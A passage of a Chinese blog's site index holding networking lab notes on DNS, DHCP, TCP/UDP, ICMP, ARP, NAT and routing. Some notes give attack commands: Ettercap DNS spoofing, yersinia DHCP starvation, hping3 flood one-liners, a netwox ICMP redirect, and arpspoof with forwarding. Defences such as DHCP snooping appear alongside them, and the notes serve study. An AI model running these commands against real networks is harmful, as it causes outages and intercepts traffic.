首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址 根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域 com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域 baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了www.baidu.com的信息，将IP地址响应给首选DNS 首选DNS响应给主机。 3、 DNS配置 缓存DNS服务器 server2016上安装DNS服务，配置转发器 将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名 wireshark抓包 server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。 4、 DNS攻击 环境： kali 192.168.101.8 攻击机器 server2016 web服务器 192.168.101.6 提供web界面 win10 192.168.101.11 被攻击的主机 工具 Ettercap 修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns 格式 要欺骗的域名 A + 目标IP 配置Ettercap，打开后扫描主机进行arp欺骗 选择目标主机以及网关add to Target，随后点击ARP poisoning , 随后选择dns_spoof 进行欺骗。 最后在目标主机访问woniu.com 被修改成了192.168.101.6 的web页面。","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"DHCP","slug":"系统基础/DHCP_new","date":"2023-03-22T16:00:00.000Z","updated":"2024-03-12T10:41:55.032Z","comments":true,"path":"2023/03/23/系统基础/DHCP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DHCP_new/","excerpt":"DHCP协议1、DHCP的工作原理 动态主机配置协议，主要给客户机提供TCP&#x2F;IP参数（IP地址、子网掩码、网关、DNS） 好处 减少管理员的工作量 减少出错的可能，避免输入错误 避免IIP冲突 提高IP地址利用 应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程 dhcp discover 客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求 dhcp offer dhcp 服务器发送的提供报文 dhcp request client 发送的request请求 dhcp ack 服务器确认，客户机获得IP参数 除了以上的还有四种报文 dhcp release dhcp nak: 针对request 的拒绝报文 dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器 dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等 2、windows server 部署 如图的拓扑结构，R1上需要在f0&#x2F;0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 如图 DHCP server 配置了两个dhcp 作用域，50和120网段 3、抓流量 示例1，释放vmnet1 的地址来抓包，查看这个过程 12ipconfig /release &quot;VMware Network Adapter VMnet1&quot;ipconfig /renew &quot;VMware Network Adapter VMnet1&quot;","text":"DHCP协议1、DHCP的工作原理 动态主机配置协议，主要给客户机提供TCP&#x2F;IP参数（IP地址、子网掩码、网关、DNS） 好处 减少管理员的工作量 减少出错的可能，避免输入错误 避免IIP冲突 提高IP地址利用 应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程 dhcp discover 客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求 dhcp offer dhcp 服务器发送的提供报文 dhcp request client 发送的request请求 dhcp ack 服务器确认，客户机获得IP参数 除了以上的还有四种报文 dhcp release dhcp nak: 针对request 的拒绝报文 dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器 dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等 2、windows server 部署 如图的拓扑结构，R1上需要在f0&#x2F;0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 如图 DHCP server 配置了两个dhcp 作用域，50和120网段 3、抓流量 示例1，释放vmnet1 的地址来抓包，查看这个过程 12ipconfig /release &quot;VMware Network Adapter VMnet1&quot;ipconfig /renew &quot;VMware Network Adapter VMnet1&quot; client获取IP地址是一直在发广播报文： dhcp server 则是发的单播报文 4、 DHCP欺骗 攻击DHCP，发送discover 报文使得DHCP服务器的IP被耗尽，从而无法提供服务。 使用的工具是 yersinia, 可以攻击DHCP服务器使得IP被耗尽，随后伪造一个DHCP服务器。 攻击的拓扑结构 5、DHCP防御 在交换机上配置信任端口 开启DHCP监听 1ip dhcp snooping 指定监听vlan 1ip dhcp snooping vlan1 由于开启监听后，交换机上的所有端口都变成非信任端口，会拒绝所有DHCP报文，需要将正常的接口配置为信任端口 12int f0/1ip dhcp snooping trust","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"UDP","slug":"系统基础/UDP_new","date":"2023-03-22T16:00:00.000Z","updated":"2024-03-12T10:42:36.252Z","comments":true,"path":"2023/03/23/系统基础/UDP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/UDP_new/","excerpt":"UDP协议 特点 不需要连接，直接发送数据，不会重新排序，也不需要确认 报文字段 源端口 目的端口 length checksum stream index timestamps udp payload 常见UDP DNS 53 ntp 123 tftp 69 rpc 111 snmp 161 udp 攻击 1hping3 -q -n --rand-source --udp -p 53 --flood 192.168.198.135 -d 10000","text":"UDP协议 特点 不需要连接，直接发送数据，不会重新排序，也不需要确认 报文字段 源端口 目的端口 length checksum stream index timestamps udp payload 常见UDP DNS 53 ntp 123 tftp 69 rpc 111 snmp 161 udp 攻击 1hping3 -q -n --rand-source --udp -p 53 --flood 192.168.198.135 -d 10000","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"tcp","slug":"系统基础/tcp_new","date":"2023-03-22T16:00:00.000Z","updated":"2024-03-12T10:42:31.474Z","comments":true,"path":"2023/03/23/系统基础/tcp_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/tcp_new/","excerpt":"TCP协议 tcp字段 三次握手 wireshark 抓包情况如下，第一次SYN&#x3D;1 seq&#x3D;391720034, 第二次SYN&#x3D;1 ACK&#x3D;1 seq &#x3D; 3010721076 ack&#x3D; 391720035, 第三次 ACK&#x3D;1, seq&#x3D;391720035 ack &#x3D; 3010721077, 第二次的seq是一个随机数，ack&#x3D;第一次seq+1, 第三次的seq&#x3D;第二次的ack，ack&#x3D; 第二次的seq+1 四次挥手 tcp 半关闭状态 tcp半连接状态 客户端syn，服务器syn, ack ,客户端不继续ack syn flood Ddos 1hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.198.135 ddos 防御 tcp代理 tcp源探测 回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行 TCP连接数量限制","text":"TCP协议 tcp字段 三次握手 wireshark 抓包情况如下，第一次SYN&#x3D;1 seq&#x3D;391720034, 第二次SYN&#x3D;1 ACK&#x3D;1 seq &#x3D; 3010721076 ack&#x3D; 391720035, 第三次 ACK&#x3D;1, seq&#x3D;391720035 ack &#x3D; 3010721077, 第二次的seq是一个随机数，ack&#x3D;第一次seq+1, 第三次的seq&#x3D;第二次的ack，ack&#x3D; 第二次的seq+1 四次挥手 tcp 半关闭状态 tcp半连接状态 客户端syn，服务器syn, ack ,客户端不继续ack syn flood Ddos 1hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.198.135 ddos 防御 tcp代理 tcp源探测 回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行 TCP连接数量限制","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"ICMP协议","slug":"系统基础/ICMP协议_new","date":"2023-03-19T16:00:00.000Z","updated":"2024-03-12T10:42:10.319Z","comments":true,"path":"2023/03/20/系统基础/ICMP协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ICMP%E5%8D%8F%E8%AE%AE_new/","excerpt":"ICMP协议1、理解ICMP协议 Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。 ICMP基本概念 网络层协议，封装在网络层和传输层之间 2、理解ICMP重定向 在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。 重定向攻击 kali上使用工具实施ICMP重定向网关 1netwox 86 -g 192.168.198.128 # 把网络中的网关修改为192.168.198.128 3、会使用wireshark分析ICMP重定向 实验条件 kaili 地址 192.168.198.128 win10地址 192.168.198.134","text":"ICMP协议1、理解ICMP协议 Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。 ICMP基本概念 网络层协议，封装在网络层和传输层之间 2、理解ICMP重定向 在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。 重定向攻击 kali上使用工具实施ICMP重定向网关 1netwox 86 -g 192.168.198.128 # 把网络中的网关修改为192.168.198.128 3、会使用wireshark分析ICMP重定向 实验条件 kaili 地址 192.168.198.128 win10地址 192.168.198.134 在kali上运行工具netwox ，伪装的网关是 192.168.198.128，随后在win10上ping www.baidu.com，接着wireshark可以看到如下结果：修改了网关地址为 192.168.198.128，但是网关随便修改成功，但是攻击失败，目标仍然可以上网，原因未知。","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"arp协议","slug":"系统基础/arp协议_new","date":"2023-03-19T16:00:00.000Z","updated":"2024-03-12T10:41:51.727Z","comments":true,"path":"2023/03/20/系统基础/arp协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/arp%E5%8D%8F%E8%AE%AE_new/","excerpt":"ARP协议一、ARP协议将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。 二、工作流程1、两个阶段 ARP请求 ARP响应 2、arp数据格式 目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址 ）","text":"ARP协议一、ARP协议将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。 二、工作流程1、两个阶段 ARP请求 ARP响应 2、arp数据格式 目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址 ） 3、arp 缓存 目的是为了防止重复请求 命令 123ARP -a #查看所有IP地址和MAC地址对应 arp -s IP MAC # 静态绑定arp -d # 清除arp 4、ARP攻击以及欺骗 ARP 攻击 禁用网络服务 如下图所示，主机A无法通信 伪造ARP应答报文，向被攻击主机响应虚假的MAC地址 当被攻击主机进行网络通信时，会将数据交给虚假的mac 地址进行转发，由于虚假的MAC地址不存在，造成被攻击主机无法访问网络 ARP欺骗 欺骗网关 伪造arp应答报文，向被攻击主机和网关响应真实的MAC地址 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C）进行转发给网关，从而来截获被攻击主机的数据，被攻击主机可以进行网络通信 欺骗主机 伪造arp应答报文，向被攻击主机和通信响应真实的MAC地址 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C），从而来截获被攻击主机的数据，被攻击主机可以进行网络通信 ​ ARP-防御 arp绑定 arp-实验 工具 arpspoof 1apt-get install dsniff 命令 1sudo arpspoof -i eth0 -t 192.168.101.11 192.168.101.1 向目标主机192.168.101.11 发送arp欺骗报文，使得192.168.101.1（网关），192.168.101.5（kali）的MAC地址都是攻击者的MAC地址，但是未开启转发，所以无法访问网络。 开启转发 1echo 1&gt; /proc/sys/net/ipv4/ip_forward 开启以后，网络恢复畅通，实现了arp 欺骗攻击。","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"WireShark","slug":"流量分析/WireShark_new","date":"2023-03-15T16:00:00.000Z","updated":"2024-03-12T15:27:37.305Z","comments":true,"path":"2023/03/16/流量分析/WireShark_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/16/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/WireShark_new/","excerpt":"协议 TCP&#x2F;IP 协议族 网络接口层 PPPOE 物理层 数据链路层 网络层：IP ARP RARP ICMP IGMP 传输层 TCP(传输控制协议) UDP（用户数据包协议） 应用层 HTTP FTP DNS DHCP HTTPS SMTP POP IMAP 0-65535 0-1023 WireShark 流量抓取工具一、网卡 对主机网卡上的数据流量进行抓取 1、网卡模式 混杂模式 设置为混杂模式才可以抓取 非混杂模式（默认），不会接收目的非自己的数据 2、界面认识 3、过滤器","text":"协议 TCP&#x2F;IP 协议族 网络接口层 PPPOE 物理层 数据链路层 网络层：IP ARP RARP ICMP IGMP 传输层 TCP(传输控制协议) UDP（用户数据包协议） 应用层 HTTP FTP DNS DHCP HTTPS SMTP POP IMAP 0-65535 0-1023 WireShark 流量抓取工具一、网卡 对主机网卡上的数据流量进行抓取 1、网卡模式 混杂模式 设置为混杂模式才可以抓取 非混杂模式（默认），不会接收目的非自己的数据 2、界面认识 3、过滤器 捕获过滤器：抓包之前过滤，只抓某些类型如TCP 显示过滤器：抓取所有类型，查看时只显示特定类型 4 过滤器的语法 捕获过滤器 类型：host net port 方向:src dst 协议: ether ip tcp udp http ftp dns 运算符: &amp;&amp; || ! 示例 抓取源IP 为192.168.18.14 并且目标端口为80 的报文 1src host 192.168.18.14 &amp;&amp; dst port 80 抓取IP 为192.168.18.1 或者192.168.18.14 的报文 1host 192.168.18.14 || host 192.168.18.1 非广播 1！broadcast 抓取源IP 192.168.18.14 或者源IP 192.168.18.0 目的TCP端口 200-1000，位于129.0.0.0&#x2F;8 1(src ip 192.168.18.14 ||src net 192.168.18.0/24) &amp;&amp; (dst portrange 200-1000 &amp;&amp; dst net 129.0.0.0/8) 显示过滤器 语法 比较的操作符： &#x3D;&#x3D; (eq) !&#x3D; (neq) &gt; (gt) &lt; (lt) &gt;&#x3D; (ge) &lt;&#x3D;(le) 逻辑操作符： and &amp;&amp; or || not IP 地址 ip.addr ip.src ip.dst 端口过滤 tcp.port udp.port tcp.dstport tcp.flag.syn 协议过滤： arp ip icmp tcp udp 示例： 显示源IP是 192.168.18.14 并且tcp 端口是443 1ip.src==192.168.18.14&amp;&amp; tcp.port==443 显示源 不为192.168.18.14 或者目的不为202.98.96.68 1ip.src!=192.168.18.14 || ip.dst!=202.98.96.68 案例 查找www.jd.com 的dns解析以及http 通信报文","categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://zwjsfdbb.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"流量分析","slug":"流量分析","permalink":"http://zwjsfdbb.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"NAT","slug":"系统基础/NAT_new","date":"2023-03-14T16:00:00.000Z","updated":"2024-03-12T10:42:24.666Z","comments":true,"path":"2023/03/15/系统基础/NAT_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/15/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/NAT_new/","excerpt":"一、NAT基本概念 将私网IP地址转换为公网IP地址 1、转换方式 静态转换 仅针对IP地址转换 1对1 1ip nat inside source static 192.168.1.1 64.23.12.34 动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网 1234567#定义内网范围access-list 1 permit 192.168.10.0 0.0.0.255#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.61 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu 端口多路复用PAT 多对1转，携带端口一起转换 192.168.1.1：8899 —》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网 端口多路复用 内网的多个地址转换为外网的一个IP地址（端口一起转换） 1234567#定义内网范围access-list 1 permit any#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.60 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu overload 内网多个地址直接转换为外网接口的地址 12345#定义内网范围access-list 1 permit any#应用ip nat inside source list 1 int g0/1 overload 端口映射(服务器映射) - 只能外网访问内网 将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器 192.168.1.1：80 -》54.234.123.55：80 1ip nat inside source static tcp 192,168.1.100 80 23.34.56.78 8888 ​","text":"一、NAT基本概念 将私网IP地址转换为公网IP地址 1、转换方式 静态转换 仅针对IP地址转换 1对1 1ip nat inside source static 192.168.1.1 64.23.12.34 动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网 1234567#定义内网范围access-list 1 permit 192.168.10.0 0.0.0.255#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.61 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu 端口多路复用PAT 多对1转，携带端口一起转换 192.168.1.1：8899 —》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网 端口多路复用 内网的多个地址转换为外网的一个IP地址（端口一起转换） 1234567#定义内网范围access-list 1 permit any#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.60 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu overload 内网多个地址直接转换为外网接口的地址 12345#定义内网范围access-list 1 permit any#应用ip nat inside source list 1 int g0/1 overload 端口映射(服务器映射) - 只能外网访问内网 将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器 192.168.1.1：80 -》54.234.123.55：80 1ip nat inside source static tcp 192,168.1.100 80 23.34.56.78 8888 ​","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"动态路由协议","slug":"系统基础/动态路由协议_new","date":"2023-03-10T16:00:00.000Z","updated":"2024-03-12T10:10:40.440Z","comments":true,"path":"2023/03/11/系统基础/动态路由协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE_new/","excerpt":"动态路由协议 动态路由协议 RIP：路由信息协议，距离矢量路由协议 OSPF：开放式最短路径优先 BGP：外部网关路由协议 特点 减少管理员的工作量 增加了网络带宽 什么是内部，什么是外部 AS：运行相同的路由协议的路由器属于同一个自治系统 通过自治系统连接外部的路由器，需要经过外部网关 内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF 外部网关路由协议：用于连接不同自治系统，BGP 动态路由协议需要考虑的内容 度量值：跳数、带宽、时延、成本 收敛：所有路由器的路由表达到一致的状态 RIP协议 基本概念 一种内部网关协议，在单一自治系统内的路由器去传递路由信息 靠跳数来衡量到达目标的距离 最大15跳，16代表不可达 每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口 从相邻的路由器去学习路由条目 不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离 OSPF 动态路由协议 概念 开放式最短路径优先路由协议，内部网关路由协议 链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息 工作过程 相邻的路由器建立邻接关系 根据链路信息，建立链路状态数据库 最短路径树计算 路由表 OSPF区域 划分区域 适应大型网络 每个ospf 路由器只维护自己所在区域的链路状态信息 每个区域有一个区域ID，用十进制或者IP地址表示 骨干区域：区域之间的路由信息传播 区域ID：0，0.0.0.0 非骨干区域：普通区域 单区域内容 在同一个区域当中通过选举DR和BDR来节省网络中的流量 区域中的其他路由器只会和DR和BDR建立邻接关系 DR 选举 通过routeID进行选举，最大的作为DR，第二大作为 BDR 度量值 cost值（代价） 邻接关系建立 以组播方式发送 224.0.0.5 代表所有OSPF 224.0.0.6 代表DR BDR 报文类型 hello保温 数据库描述包 链路状态请求包 链路状态更新包 链路状态确认包 RIP 和OSPF对比 RIP１ 不支持可变长子网掩码，使用广播更新 RIP 2 使用组播更新 跳数限制15跳 不能划分区域，网络收敛慢 OSPF 使用组播更新 网络收敛快，通过区域划分 支持可变长子网掩码，携带子网掩码 ospf 配置 12345route ospf 10netword 192.168.10.0 0.0.0.255 area 0192.168.10.0 宣告的网段 0.0.0.255 反码 area 表示宣告的区域show ip ospf 查看ospf 基本配置信息show ip ospf neighbor 查看邻接关系 ospf 多区域概念 目的 实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表 通信 域内通信量 域外通信量- ABR 外部通信量-与其他自治系统 ASBR 区域 骨干区域 非骨干区域 标准区域 末梢区域 完全末梢 非纯末梢 OSPF 高级配置 路由重分发 在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。 NSSA 非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发 多了一种类型LSA，类型7LSA在一个 NSSA区域内携带外部信息 在NSSA的ABR上转换位5LSA N1 N2类型 通过NSSA的ABR之后转换为E1、E2 虚链路 在两台ABR之间建立，穿越一个非骨干区域","text":"动态路由协议 动态路由协议 RIP：路由信息协议，距离矢量路由协议 OSPF：开放式最短路径优先 BGP：外部网关路由协议 特点 减少管理员的工作量 增加了网络带宽 什么是内部，什么是外部 AS：运行相同的路由协议的路由器属于同一个自治系统 通过自治系统连接外部的路由器，需要经过外部网关 内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF 外部网关路由协议：用于连接不同自治系统，BGP 动态路由协议需要考虑的内容 度量值：跳数、带宽、时延、成本 收敛：所有路由器的路由表达到一致的状态 RIP协议 基本概念 一种内部网关协议，在单一自治系统内的路由器去传递路由信息 靠跳数来衡量到达目标的距离 最大15跳，16代表不可达 每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口 从相邻的路由器去学习路由条目 不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离 OSPF 动态路由协议 概念 开放式最短路径优先路由协议，内部网关路由协议 链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息 工作过程 相邻的路由器建立邻接关系 根据链路信息，建立链路状态数据库 最短路径树计算 路由表 OSPF区域 划分区域 适应大型网络 每个ospf 路由器只维护自己所在区域的链路状态信息 每个区域有一个区域ID，用十进制或者IP地址表示 骨干区域：区域之间的路由信息传播 区域ID：0，0.0.0.0 非骨干区域：普通区域 单区域内容 在同一个区域当中通过选举DR和BDR来节省网络中的流量 区域中的其他路由器只会和DR和BDR建立邻接关系 DR 选举 通过routeID进行选举，最大的作为DR，第二大作为 BDR 度量值 cost值（代价） 邻接关系建立 以组播方式发送 224.0.0.5 代表所有OSPF 224.0.0.6 代表DR BDR 报文类型 hello保温 数据库描述包 链路状态请求包 链路状态更新包 链路状态确认包 RIP 和OSPF对比 RIP１ 不支持可变长子网掩码，使用广播更新 RIP 2 使用组播更新 跳数限制15跳 不能划分区域，网络收敛慢 OSPF 使用组播更新 网络收敛快，通过区域划分 支持可变长子网掩码，携带子网掩码 ospf 配置 12345route ospf 10netword 192.168.10.0 0.0.0.255 area 0192.168.10.0 宣告的网段 0.0.0.255 反码 area 表示宣告的区域show ip ospf 查看ospf 基本配置信息show ip ospf neighbor 查看邻接关系 ospf 多区域概念 目的 实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表 通信 域内通信量 域外通信量- ABR 外部通信量-与其他自治系统 ASBR 区域 骨干区域 非骨干区域 标准区域 末梢区域 完全末梢 非纯末梢 OSPF 高级配置 路由重分发 在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。 NSSA 非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发 多了一种类型LSA，类型7LSA在一个 NSSA区域内携带外部信息 在NSSA的ABR上转换位5LSA N1 N2类型 通过NSSA的ABR之后转换为E1、E2 虚链路 在两台ABR之间建立，穿越一个非骨干区域","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"热备份路由选择协议","slug":"系统基础/热备份路由选择协议_new","date":"2023-03-09T16:00:00.000Z","updated":"2024-03-12T10:41:33.251Z","comments":true,"path":"2023/03/10/系统基础/热备份路由选择协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E7%83%AD%E5%A4%87%E4%BB%BD%E8%B7%AF%E7%94%B1%E9%80%89%E6%8B%A9%E5%8D%8F%E8%AE%AE_new/","excerpt":"HSRP（热备份路由选择协议）目标1、了解HSRP的相关概念 2、理解工作原理 3、配置 一、概念1、成员 活跃路由器 备份路由器 虚拟路由器 其他路由器 2、虚拟MAC地址 ４８位包括前２４ 厂商编码，后２４位序列号 后24位包括固定值07AC+HSRP组号","text":"HSRP（热备份路由选择协议）目标1、了解HSRP的相关概念 2、理解工作原理 3、配置 一、概念1、成员 活跃路由器 备份路由器 虚拟路由器 其他路由器 2、虚拟MAC地址 ４８位包括前２４ 厂商编码，后２４位序列号 后24位包括固定值07AC+HSRP组号 3、HSRP 消息 UDP协议，端口号1985 组播模式 224.0.0.2 生命周期 TTL&#x3D;1 二、工作原理如下，主机要访问外网，将数据交给自己的网关，在这里主机配置的网关是HSRP组中的虚拟路由器，虚拟路由器收到数据后，根据HSRP组中的机制，将数据交给活跃的路由器进行转发，活跃路路由器根据自身路由表进行转发数据。 设置组号（决定虚拟路由器的MAC地址） 优先级 占先","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"路由器相关知识","slug":"系统基础/路由器相关知识_new","date":"2023-03-08T16:00:00.000Z","updated":"2024-03-12T10:41:24.934Z","comments":true,"path":"2023/03/09/系统基础/路由器相关知识_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/09/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86_new/","excerpt":"1、路由器相关知识 三层设备 网络层功能 逻辑地址寻址，实现不同网络直接的路径选择 查找目的是否可达，可达则选择最优路径 网络层传输的是PDU ,IP数据包 2、IP数据包的格式 IPV4 数据包格式 3、路由器的工作原理 路由 从源主机到目标主机的转发过程 包含两个内容 确定最佳路径（手动绑定，根据动态路由协商方式） 通过网络传输信息 路由表 直接路由：当路由器的接口配置好对应的IP地址并开启接口后自动生成 非直接路由：需要手动配置静态路由或者使用动态路由协议学习 4、静态路由 管理员配置、不灵活 特殊的静态路由：默认路由 使用场景：一般应用于末节网络 123ip route 目标网络 下一跳地址或者接口ip route 192.168.10.0 255.255.255.0 192.168.30.2ip route 192.168.10.0 255.255.255.0 f0/1 5、动态路由 通过某种动态路由协议自动的去建立自己的路由表 常见的动态路由协议，RIP OSPF","text":"1、路由器相关知识 三层设备 网络层功能 逻辑地址寻址，实现不同网络直接的路径选择 查找目的是否可达，可达则选择最优路径 网络层传输的是PDU ,IP数据包 2、IP数据包的格式 IPV4 数据包格式 3、路由器的工作原理 路由 从源主机到目标主机的转发过程 包含两个内容 